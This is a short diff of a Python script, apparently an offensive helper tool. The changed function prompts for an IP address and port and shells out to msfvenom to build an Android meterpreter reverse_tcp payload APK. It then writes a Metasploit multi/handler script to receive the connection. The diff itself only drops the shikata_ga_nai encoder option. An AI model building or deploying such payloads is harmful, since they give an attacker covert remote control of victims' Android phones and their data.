@@ -56,7 +56,7 @@ def tres():
     else:
         lhost=input('Ip: ')
         lport=input('Port: ')
-        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -e x86/shikata_ga_nai -o payload.apk')
+        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -o payload.apk')
         with open('initmsfc', 'w') as f:
             f.write('use exploit/multi/handler\n')
             f.write('set payload android/meterpreter/reverse_tcp\n')
